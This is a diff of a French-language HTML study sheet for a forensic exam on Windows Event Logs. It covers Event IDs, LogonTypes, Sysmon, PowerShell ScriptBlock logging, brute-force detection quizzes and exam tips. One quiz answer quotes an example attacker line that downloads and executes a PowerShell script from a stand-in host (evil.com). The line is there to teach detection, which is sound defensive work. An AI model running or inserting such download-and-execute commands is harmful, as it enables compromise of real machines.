@@ -22,6 +22,7 @@
 
 </head>
 <body>
+<div id="scroll-progress"></div>
 <a href="#main-content" class="skip-link" style="position:absolute;left:-9999px;top:0;z-index:999;padding:.5rem 1rem;background:var(--cyan);color:var(--bg);font-size:.8rem;border-radius:0 0 4px 0;text-decoration:none">Aller au contenu</a>
 <nav class="tn-nav" aria-label="Navigation fiche">
   <a href="index.html" class="tn-back">← Fiches</a>
@@ -47,6 +48,132 @@
   <div>
     <div><span class="tag tag-blue">Event Logs</span><span class="tag tag-red">EVTX</span><span class="tag tag-orange">Chainsaw · Hayabusa</span></div>
     <div class="meta" style="margin-top:.4rem">Event IDs forensiques · Security / System / Application · Analyse rapide</div>
+  </div>
+</div>
+
+<div class="prereq-block">
+  <div class="prereq-row"><span class="prereq-label">Prérequis :</span><a href="windows.html" class="prereq-pill">📖 Artefacts Windows</a><a href="windows_forensique.html" class="prereq-pill">📖 Windows Forensique</a></div>
+  <div class="prereq-row"><span class="prereq-label">Pratiquer :</span><a href="../tp.html?cat=ir" class="tp-pill">🧪 🚨 Incident Response</a><a href="../tp.html?cat=timestomping" class="tp-pill">🧪 🕰 Timestomping</a></div>
+  <div class="prereq-row"><span class="prereq-label">Voir aussi :</span><a href="windows.html" class="related-pill">🔗 Artefacts Windows</a><a href="active_directory.html" class="related-pill">🔗 Active Directory</a><a href="timeline.html" class="related-pill">🔗 Timeline</a></div>
+</div>
+
+<div class="concept-card">
+  <div class="concept-title">📋 Event Logs Windows — La caisse noire de l'OS</div>
+  Les <strong>Event Logs</strong> Windows constituent l'<strong>équivalent forensique d'une caisse noire d'avion</strong> — un système d'enregistrement automatique qui capture <strong>en continu</strong> les événements de sécurité, système, et applications. Format moderne <strong>EVTX</strong> (XML binaire, depuis Vista/2008) remplaçant l'ancien EVT (jusqu'à XP/2003). Stockés dans <code>C:\Windows\System32\winevt\Logs\</code>, ils sont organisés en <strong>centaines de canaux</strong>. Les <strong>3 canaux essentiels</strong> : <strong>Security.evtx</strong> (authentifications, accès, audit), <strong>System.evtx</strong> (services, drivers, démarrage/arrêt), <strong>Application.evtx</strong> (applications). Mais en environnement professionnel, des dizaines de canaux complémentaires existent : <strong>Microsoft-Windows-PowerShell/Operational</strong> (commandes PS, EID 4104 = goldmine !), <strong>Sysmon/Operational</strong> (si déployé, hash + PPID), <strong>TerminalServices-RemoteConnectionManager</strong> (RDP entrants), <strong>TaskScheduler/Operational</strong> (persistance), etc. <strong>Particularités forensiques cruciales</strong> : (1) <strong>Audit doit être configuré</strong> — par défaut, beaucoup d'événements importants (4688 process creation, 5156 connexions réseau) <em>ne sont pas loggés</em> sans activation explicite (Group Policy), (2) Les fichiers EVTX sont <strong>verrouillés</strong> par le service Event Log lors d'un système live → acquisition via VSS, (3) <strong>Volume énorme</strong> en entreprise (~10 000 events/heure/poste), d'où l'importance d'outils comme <strong>Chainsaw</strong>, <strong>Hayabusa</strong>, <strong>EvtxECmd</strong>, ou ingestion SIEM (Splunk, Elastic). <strong>Pour l'examen CAS-IN</strong> : maîtriser les <strong>Event IDs critiques</strong> (4624/4625/4688/4698/4768/4769/7045/4104) et leurs <strong>LogonTypes</strong> (Type 3 = SMB réseau, Type 10 = RDP) est essentiel.
+</div>
+
+<!-- ════════════════════════════════════════════════════════════
+     SCHÉMA SVG — HIÉRARCHIE EVENT LOGS
+     ════════════════════════════════════════════════════════════ -->
+<div class="schema">
+  <div class="schema-title">📋 Event Logs Windows — Canaux + Event IDs critiques</div>
+  <div class="schema-sub">SECURITY · SYSTEM · APPLICATION · CANAUX SPÉCIALISÉS · LOGON TYPES</div>
+  <svg viewBox="0 0 720 380" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Event Logs Windows">
+    <defs>
+      <marker id="arr-evtx" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
+        <polygon points="0 0, 10 3, 0 6" fill="#58A6FF"/>
+      </marker>
+    </defs>
+
+    <!-- Header -->
+    <rect x="20" y="15" width="680" height="36" rx="6" fill="rgba(13,17,23,.5)" stroke="rgba(88,166,255,.4)" stroke-width="1.2"/>
+    <text x="360" y="33" text-anchor="middle" font-family="Inter,sans-serif" font-size="11.5" font-weight="800" fill="#58A6FF">📋 EVTX = format binaire XML · C:\Windows\System32\winevt\Logs\ · audit doit être activé</text>
+    <text x="360" y="46" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="8.5" fill="#A8B5C8">Vista/2008+ remplace .evt · 100+ canaux possibles · ~10 000 events/h en entreprise</text>
+
+    <!-- 3 canaux principaux -->
+    <rect x="20" y="65" width="220" height="115" rx="8" fill="rgba(255,64,96,.07)" stroke="#FF4060" stroke-width="1.5"/>
+    <text x="130" y="85" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#FF4060">🔴 Security.evtx</text>
+    <text x="130" y="100" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#A8B5C8">authentifications · audit</text>
+    <text x="35" y="118" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#FF4060">• 4624 logon réussi</text>
+    <text x="35" y="130" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#FF4060">• 4625 logon échec</text>
+    <text x="35" y="142" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#FF4060">• 4648 creds explicites</text>
+    <text x="35" y="154" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#FF4060">• 4672 privs spéciaux</text>
+    <text x="35" y="166" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#FF4060">• 4688 process create</text>
+    <text x="35" y="176" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">+ 4720/4728/4732 (creation/groupe)</text>
+
+    <rect x="250" y="65" width="220" height="115" rx="8" fill="rgba(240,192,64,.07)" stroke="#F0C040" stroke-width="1.5"/>
+    <text x="360" y="85" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#F0C040">🟡 System.evtx</text>
+    <text x="360" y="100" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#A8B5C8">services · drivers · système</text>
+    <text x="265" y="118" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#F0C040">• 7045 service installé</text>
+    <text x="265" y="130" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#F0C040">• 7036 état service</text>
+    <text x="265" y="142" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#F0C040">• 6005/6006 boot/shutdown</text>
+    <text x="265" y="154" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#F0C040">• 6008 shutdown anormal</text>
+    <text x="265" y="166" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#F0C040">• 1074 reboot par user</text>
+    <text x="265" y="176" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">→ persistance via service</text>
+
+    <rect x="480" y="65" width="220" height="115" rx="8" fill="rgba(48,232,138,.07)" stroke="#30E88A" stroke-width="1.5"/>
+    <text x="590" y="85" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#30E88A">🟢 Application.evtx</text>
+    <text x="590" y="100" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#A8B5C8">applications installées</text>
+    <text x="495" y="118" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#30E88A">• Erreurs applis</text>
+    <text x="495" y="130" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#30E88A">• Crashes</text>
+    <text x="495" y="142" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#30E88A">• AV detections</text>
+    <text x="495" y="154" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#30E88A">• MS Office events</text>
+    <text x="495" y="166" font-family="JetBrains Mono,monospace" font-size="7.5" fill="#30E88A">• Windows Defender</text>
+    <text x="495" y="176" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">→ EID 1116/1117 = malware détecté</text>
+
+    <!-- Bandeau canaux spécialisés -->
+    <text x="360" y="205" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#A8B5C8" letter-spacing="1">↓  CANAUX SPÉCIALISÉS (forensique avancée)  ↓</text>
+    <line x1="40" y1="213" x2="680" y2="213" stroke="rgba(168,181,200,.3)" stroke-width=".5"/>
+
+    <rect x="20" y="225" width="160" height="65" rx="5" fill="rgba(188,140,255,.08)" stroke="#BC8CFF" stroke-width="1.2"/>
+    <text x="100" y="242" text-anchor="middle" font-family="Inter,sans-serif" font-size="9" font-weight="700" fill="#BC8CFF">⚡ PowerShell/Op.</text>
+    <text x="100" y="258" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">EID 4104 = ScriptBlock</text>
+    <text x="100" y="270" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">⭐ décode obfuscation</text>
+    <text x="100" y="282" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="6.5" fill="#6A80A8">EID 4103 = pipeline</text>
+
+    <rect x="190" y="225" width="160" height="65" rx="5" fill="rgba(0,229,204,.08)" stroke="#00E5CC" stroke-width="1.2"/>
+    <text x="270" y="242" text-anchor="middle" font-family="Inter,sans-serif" font-size="9" font-weight="700" fill="#00E5CC">🛡 Sysmon/Op.</text>
+    <text x="270" y="258" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">EID 1 = ProcCreate+hash</text>
+    <text x="270" y="270" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">EID 3 = NetworkConnect</text>
+    <text x="270" y="282" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="6.5" fill="#6A80A8">si déployé (Sysinternals)</text>
+
+    <rect x="360" y="225" width="160" height="65" rx="5" fill="rgba(240,136,62,.08)" stroke="#F0883E" stroke-width="1.2"/>
+    <text x="440" y="242" text-anchor="middle" font-family="Inter,sans-serif" font-size="9" font-weight="700" fill="#F0883E">🖥 RDP / Terminal</text>
+    <text x="440" y="258" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">RemoteConnectionMgr</text>
+    <text x="440" y="270" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">EID 1149 = RDP réussie</text>
+    <text x="440" y="282" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="6.5" fill="#6A80A8">+ source IP</text>
+
+    <rect x="530" y="225" width="170" height="65" rx="5" fill="rgba(255,64,96,.08)" stroke="#FF4060" stroke-width="1.2"/>
+    <text x="615" y="242" text-anchor="middle" font-family="Inter,sans-serif" font-size="9" font-weight="700" fill="#FF4060">📅 TaskScheduler</text>
+    <text x="615" y="258" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">EID 4698 = task créée</text>
+    <text x="615" y="270" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">EID 106 = task activée</text>
+    <text x="615" y="282" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="6.5" fill="#6A80A8">→ persistance</text>
+
+    <!-- LogonTypes critiques -->
+    <text x="360" y="312" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#A8B5C8" letter-spacing="1">↓  LOGON TYPES (EID 4624) — À CONNAÎTRE ABSOLUMENT  ↓</text>
+    <line x1="40" y1="320" x2="680" y2="320" stroke="rgba(168,181,200,.3)" stroke-width=".5"/>
+
+    <rect x="20" y="332" width="106" height="40" rx="4" fill="rgba(48,232,138,.06)" stroke="rgba(48,232,138,.4)"/>
+    <text x="73" y="348" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="9" font-weight="700" fill="#30E88A">Type 2</text>
+    <text x="73" y="362" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">Console locale</text>
+
+    <rect x="135" y="332" width="106" height="40" rx="4" fill="rgba(255,64,96,.08)" stroke="#FF4060" stroke-width="1.2"/>
+    <text x="188" y="348" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="9" font-weight="700" fill="#FF4060">Type 3 ⚠</text>
+    <text x="188" y="362" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">Réseau (SMB / PtH)</text>
+
+    <rect x="250" y="332" width="106" height="40" rx="4" fill="rgba(240,192,64,.06)" stroke="rgba(240,192,64,.4)"/>
+    <text x="303" y="348" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="9" font-weight="700" fill="#F0C040">Type 4/5</text>
+    <text x="303" y="362" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">Batch / Service</text>
+
+    <rect x="365" y="332" width="106" height="40" rx="4" fill="rgba(88,166,255,.06)" stroke="rgba(88,166,255,.4)"/>
+    <text x="418" y="348" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="9" font-weight="700" fill="#58A6FF">Type 7</text>
+    <text x="418" y="362" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">Déverrouillage</text>
+
+    <rect x="480" y="332" width="106" height="40" rx="4" fill="rgba(255,64,96,.08)" stroke="#FF4060" stroke-width="1.2"/>
+    <text x="533" y="348" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="9" font-weight="700" fill="#FF4060">Type 10 ⭐</text>
+    <text x="533" y="362" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">RDP</text>
+
+    <rect x="595" y="332" width="106" height="40" rx="4" fill="rgba(188,140,255,.06)" stroke="rgba(188,140,255,.4)"/>
+    <text x="648" y="348" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="9" font-weight="700" fill="#BC8CFF">Type 11</text>
+    <text x="648" y="362" text-anchor="middle" font-family="JetBrains Mono,monospace" font-size="7" fill="#A8B5C8">Cached (offline)</text>
+  </svg>
+  <div class="schema-legend">
+    <span class="lg-item"><span class="lg-dot" style="background:#FF4060"></span>Security (auth)</span>
+    <span class="lg-item"><span class="lg-dot" style="background:#F0C040"></span>System (services)</span>
+    <span class="lg-item"><span class="lg-dot" style="background:#30E88A"></span>Application</span>
+    <span class="lg-item"><span class="lg-dot" style="background:#BC8CFF"></span>PowerShell</span>
+    <span class="lg-item"><span class="lg-dot" style="background:#00E5CC"></span>Sysmon</span>
+    <span class="lg-item"><span class="lg-dot" style="background:#F0883E"></span>RDP</span>
   </div>
 </div>
 
@@ -108,15 +235,7 @@
 <tr><td style="padding:.25rem .5rem"><strong style="color:var(--cyan)">Type 3</strong></td><td style="padding:.25rem .5rem">Réseau (accès partage SMB)</td></tr>
 <tr><td style="padding:.25rem .5rem"><strong style="color:var(--cyan)">Type 4</strong></td><td style="padding:.25rem .5rem">Batch (tâche planifiée)</td></tr>
 <tr><td style="padding:.25rem .5rem"><strong style="color:var(--cyan)">Type 5</strong></td><td style="padding:.25rem .5rem">Service Windows</td></tr>
-<tr><td style="padding:.25rem .5rem"><strong style="c<div class="prereq-block">
-<div class="prereq-row">
-  <span class="prereq-label">Prérequis :</span><a href="windows.html" class="prereq-pill">📖 Artefacts Windows</a>
-</div><div class="prereq-row">
-  <span class="prereq-label">Pratiquer :</span><a href="../tp.html?cat=timestomping" class="tp-pill" onclick="sessionStorage.setItem('tp_start_cat','timestomping')">🧪 🕰 Timestomping</a>
-</div><div class="prereq-row">
-  <span class="prereq-label">Voir aussi :</span><a href="windows.html" class="related-pill">🔗 Artefacts Windows</a><a href="timeline.html" class="related-pill">🔗 Timeline</a>
-</div></div>
-olor:var(--gold)">Type 7</strong></td><td style="padding:.25rem .5rem">Déverrouillage d'écran</td></tr>
+<tr><td style="padding:.25rem .5rem"><strong style="color:var(--gold)">Type 7</strong></td><td style="padding:.25rem .5rem">Déverrouillage d'écran</td></tr>
 <tr><td style="padding:.25rem .5rem"><strong style="color:var(--red)">Type 10</strong></td><td style="padding:.25rem .5rem">RDP / RemoteInteractive ⭐</td></tr>
 <tr><td style="padding:.25rem .5rem"><strong style="color:var(--purple)">Type 11</strong></td><td style="padding:.25rem .5rem">CachedInteractive (offline)</td></tr>
 </tbody></table></div>
@@ -145,7 +264,78 @@ olor:var(--gold)">Type 7</strong></td><td style="padding:.25rem .5rem">Déverrou
 
 <div class="info">💡 <strong>PowerShell ScriptBlock Logging (4104) :</strong> Même si le script utilise des techniques d'obfuscation (base64, IEX, Invoke-Expression), Windows décode le script avant exécution et l'enregistre <em>décodé</em> dans l'Event 4104. Une des sources forensiques les plus précieuses contre les attaques "living off the land".</div>
 
-<div class="alert">⚖️ <strong>Examen CAS-IN :</strong> 4624 Type 10 = RDP · 4624 Type 3 = SMB réseau · 4625 = échec login (brute force) · 4688 = processus créé · 7045 = nouveau service (malware) · 4698 = tâche planifiée · 4104 = ScriptBlock PowerShell · Sysmon 1 = processus+hash · Sysmon 3 = connexion réseau par processus.</div>
+<!-- QUIZ -->
+<div class="sec"><div class="sec-title">🧠 Testez-vous</div>
+<div class="quiz-wrap">
+  <div class="quiz-q">Vous trouvez sur un serveur 200 EID 4625 en 30 secondes depuis la même IP, puis 1 EID 4624 LogonType 3 réussi. Que se passe-t-il ?<small>Détection · Niveau : facile</small></div>
+  <div class="quiz-actions"><button class="quiz-reveal-btn">Révéler →</button></div>
+  <div class="quiz-answer"><strong>Brute force réussi</strong>. Pattern classique : (1) <strong>200 échecs en 30 secondes</strong> = vélocité non-humaine = automated brute force/spray. (2) <strong>Même IP source</strong> = un seul attaquant ou outil. (3) <strong>EID 4624 LogonType 3</strong> juste après = succès via SMB/réseau (compte trouvé). <strong>Procédure d'enquête</strong> : (a) Identifier le compte cible (TargetUserName dans les 4625) — souvent admin local ou compte service, (b) Identifier l'IP source (IpAddress) et la résoudre (whois, geolocation), (c) Examiner les <strong>SubStatus</strong> dans les 4625 : <code>0xC0000064</code> = user n'existe pas, <code>0xC000006A</code> = bad password, <code>0xC0000234</code> = account locked. Si on voit beaucoup de 0xC000006A → spray sur compte existant (a deviné). (d) <strong>EID 4625 → 4624</strong> sur même compte = preuve de succès. (e) <strong>Étapes post-compromission</strong> à examiner : EID 4672 (privs admin), 4688 (process créé par l'attaquant), 7045 (service installé), 4698 (task), 4624 sur d'autres machines (lateral movement). <strong>Réponse immédiate</strong> : (1) <strong>Reset password</strong> du compte compromis, (2) Bloquer l'IP au firewall, (3) Audit complet du compte (qu'a-t-il fait après login), (4) Vérifier persistance, (5) <strong>RAM dump</strong> de la machine cible si possible. <strong>Prévention</strong> : Account Lockout Policy (verrouillage après N échecs), MFA, IP filtering, Windows Defender for Identity.</div>
+</div>
+<div class="quiz-wrap">
+  <div class="quiz-q">Quelle différence entre <strong>EID 4688</strong> et <strong>Sysmon Event 1</strong> ? Pourquoi déployer Sysmon ?<small>Logging · Niveau : moyen</small></div>
+  <div class="quiz-actions"><button class="quiz-reveal-btn">Révéler →</button></div>
+  <div class="quiz-answer">Les deux loggent la <strong>création d'un processus</strong>, mais avec une <strong>granularité très différente</strong>. <strong>EID 4688</strong> (Security log) est le logging natif Windows : il faut activer <em>« Audit Process Creation »</em> dans la Group Policy + (optionnel) <em>« Include command line »</em>. Champs disponibles : <code>NewProcessId</code>, <code>NewProcessName</code> (chemin exe), <code>TokenElevationType</code>, <code>ProcessCommandLine</code> (si activé), <code>ParentProcessName</code>. <strong>Pas de hash</strong>, pas de SHA-256. <strong>Sysmon Event 1</strong> (Microsoft-Windows-Sysmon/Operational, déployé via System Monitor de Sysinternals) : champs <strong>très riches</strong> : <code>Image</code>, <code>CommandLine</code>, <code>CurrentDirectory</code>, <code>User</code>, <code>LogonId</code>, <code>TerminalSessionId</code>, <code>IntegrityLevel</code>, <strong><code>Hashes</code> (MD5+SHA-1+SHA-256+IMPHASH)</strong>, <code>ParentProcessGuid</code>, <code>ParentImage</code>, <code>ParentCommandLine</code>, <code>OriginalFileName</code>. <strong>Pourquoi Sysmon est-il préféré en DFIR ?</strong> (1) <strong>Hash inclus</strong> = identification fiable même si fichier renommé, (2) <strong>ParentCommandLine</strong> = contexte complet du parent (souvent crucial pour comprendre la chaîne), (3) <strong>OriginalFileName</strong> = le vrai nom de l'exe (mfc.dll renommé en explorer.exe est révélé), (4) <strong>IntegrityLevel</strong> = détecte les UAC bypass, (5) <strong>Configuration fine</strong> via XML (filtrage des bruits), (6) <strong>Bien plus d'événements</strong> (28 types : connexion réseau EID 3, création fichier 11, modif registre 13, raw disk read 9, etc.). <strong>Déploiement recommandé</strong> : SwiftOnSecurity sysmon-config.xml comme baseline, puis ajustement. <strong>NB</strong> : Sysmon n'est <strong>pas activé par défaut</strong> sur Windows, c'est un addon — vérifier sa présence en début d'incident.</div>
+</div>
+<div class="quiz-wrap">
+  <div class="quiz-q">Pourquoi l'EID <strong>4104</strong> (PowerShell ScriptBlock) est-il un goldmine forensique contre les attaques modernes ?<small>PowerShell · Niveau : moyen</small></div>
+  <div class="quiz-actions"><button class="quiz-reveal-btn">Révéler →</button></div>
+  <div class="quiz-answer">L'EID <strong>4104</strong> dans <code>Microsoft-Windows-PowerShell/Operational</code> enregistre <strong>chaque ScriptBlock PowerShell exécuté</strong> — et <strong>cruciale-ment, après que Windows l'a décodé</strong>. C'est le contournement parfait de l'<strong>obfuscation</strong>, qui est la technique #1 des attaquants modernes (« living off the land binaries », LOLBins). <strong>Comment ça marche</strong> : avant qu'un script PowerShell ne soit exécuté, le moteur PowerShell doit le <em>compiler</em> en bytecode interne — ce qui implique de <strong>résoudre tous les niveaux d'obfuscation</strong> (Base64, gzip, char concatenation, format strings, etc.). Le ScriptBlock Logging capture <em>juste avant l'exécution</em>, donc <strong>en clair</strong>. <strong>Exemples</strong> : un attaquant lance <code>powershell -EncodedCommand &lt;long-base64&gt;</code>. Dans EID 4688 on verra juste la ligne de commande encodée. Dans EID 4104, on voit le code <em>décodé</em> : <code>IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')</code>. <strong>Activation requise</strong> (par défaut désactivé) : Group Policy <code>Computer Configuration\Policies\Administrative Templates\Windows Components\Windows PowerShell\Turn on PowerShell Script Block Logging</code>. <strong>Volume</strong> : peut générer beaucoup d'événements en environnement avec scripts admin → filtrer intelligemment dans SIEM. <strong>Anti-forensique</strong> : un attaquant averti peut <strong>désactiver le ScriptBlock Logging</strong> au début de son script via <code>$LogPS = ...</code> — détecter cette manœuvre = signal d'attaque sophistiquée. <strong>Complément</strong> : EID 4103 (Module Logging) capture les pipelines, EID 600/601 (provider) — moins utiles. <strong>Outils</strong> : <code>EvtxECmd</code> ou <code>Hayabusa</code> avec règles Sigma <code>win_susp_powershell</code> pour détecter automatiquement.</div>
+</div>
+</div>
+
+<div class="exam-tip">
+  <div class="exam-tip-title">🎓 Exam Tip — Logs Windows / Event IDs</div>
+  <p><strong>Format</strong> : EVTX (Vista/2008+) · binaire XML · <code>C:\Windows\System32\winevt\Logs\</code></p>
+  <p><strong>━━ CANAUX PRINCIPAUX ━━</strong></p>
+  <p>• <strong>Security.evtx</strong> = authentification, audit (audit doit être activé !)</p>
+  <p>• <strong>System.evtx</strong> = services, drivers, démarrage</p>
+  <p>• <strong>Application.evtx</strong> = applications, AV, crashes</p>
+  <p>• <strong>Microsoft-Windows-PowerShell/Operational</strong> = scripts PS</p>
+  <p>• <strong>Microsoft-Windows-Sysmon/Operational</strong> = si Sysmon déployé</p>
+  <p>• <strong>TerminalServices/RemoteConnectionManager</strong> = RDP</p>
+  <p>• <strong>TaskScheduler/Operational</strong> = tâches planifiées</p>
+  <p><strong>━━ AUTHENTIFICATION (Security) ━━</strong></p>
+  <p>• <strong>4624</strong> = logon réussi (avec LogonType)</p>
+  <p>• <strong>4625</strong> = logon échec (SubStatus = raison)</p>
+  <p>• <strong>4634/4647</strong> = logoff</p>
+  <p>• <strong>4648</strong> = creds explicites (runas, mouvement latéral)</p>
+  <p>• <strong>4672</strong> = privs spéciaux à la connexion (admin)</p>
+  <p>• <strong>4720</strong> = compte créé · <strong>4732</strong> = ajout groupe Admin</p>
+  <p><strong>━━ LOGON TYPES (Event 4624) ━━</strong></p>
+  <p>• Type 2 = Console locale interactive</p>
+  <p>• <strong>Type 3 = Réseau (SMB) ⚠ PtH possible</strong></p>
+  <p>• Type 4/5 = Batch / Service</p>
+  <p>• Type 7 = Déverrouillage écran</p>
+  <p>• <strong>Type 10 = RDP / RemoteInteractive ⭐</strong></p>
+  <p>• Type 11 = CachedInteractive (offline laptop)</p>
+  <p><strong>━━ PROCESSUS ━━</strong></p>
+  <p>• <strong>4688</strong> (Security) = ProcessCreate (audit + cmdline si activé)</p>
+  <p>• <strong>Sysmon EID 1</strong> = ProcessCreate avec hash + PPID + ParentCommandLine ⭐</p>
+  <p>• <strong>4689</strong> = process terminé · 4688→4689 = durée d'exécution</p>
+  <p><strong>━━ KERBEROS / AD (sur DC) ━━</strong></p>
+  <p>• <strong>4768</strong> = TGT demandé · <strong>4769</strong> = TGS · <strong>4771</strong> = preauth fail</p>
+  <p>• <strong>4776</strong> = NTLM validation · <strong>4662</strong> = objet AD accédé</p>
+  <p><strong>━━ PERSISTANCE ━━</strong></p>
+  <p>• <strong>7045</strong> (System) = nouveau service ⚠ malware</p>
+  <p>• <strong>4697</strong> (Security) = service installé (audit)</p>
+  <p>• <strong>4698</strong> (Security) = tâche planifiée créée</p>
+  <p>• <strong>106</strong> (TaskScheduler) = task activée</p>
+  <p><strong>━━ POWERSHELL ━━</strong></p>
+  <p>• <strong>4104</strong> ⭐ = ScriptBlock (décode obfuscation !) — DOIT être activé</p>
+  <p>• <strong>4103</strong> = Module Logging (pipeline)</p>
+  <p><strong>━━ SYSMON (si déployé) ━━</strong></p>
+  <p>• 1 = ProcessCreate (hash, PPID)</p>
+  <p>• 3 = Network connection</p>
+  <p>• 7 = Image loaded (DLL)</p>
+  <p>• 8 = CreateRemoteThread (injection)</p>
+  <p>• 11 = File created · 13 = Registry value set</p>
+  <p>• 22 = DNS query</p>
+  <p><strong>━━ OUTILS ━━</strong></p>
+  <p>• <strong>Chainsaw</strong> (Sigma rules) · <strong>Hayabusa</strong> (timeline) · <strong>EvtxECmd</strong> (Eric Zimmerman)</p>
+  <p>• <strong>SIEM</strong> (Splunk · Elastic · Sentinel) en environnement entreprise</p>
+</div>
+
+<div class="alert">⚖️ <strong>Examen CAS-IN :</strong> 4624 Type 10 = RDP · 4624 Type 3 = SMB réseau · 4625 = échec login (brute force) · 4688 = processus créé · 7045 = nouveau service (malware) · 4698 = tâche planifiée · 4104 = ScriptBlock PowerShell (décode obfuscation) · Sysmon 1 = processus+hash · Sysmon 3 = connexion réseau par processus · 4768/4769 = TGT/TGS Kerberos · 4776 = NTLM (PtH).</div>
 <div class="footer">
   <span>CAS-IN Investigation Numérique · Forensique Suisse</span>
   <span>Ch. 16 Manuel · Microsoft Event Log Reference</span>
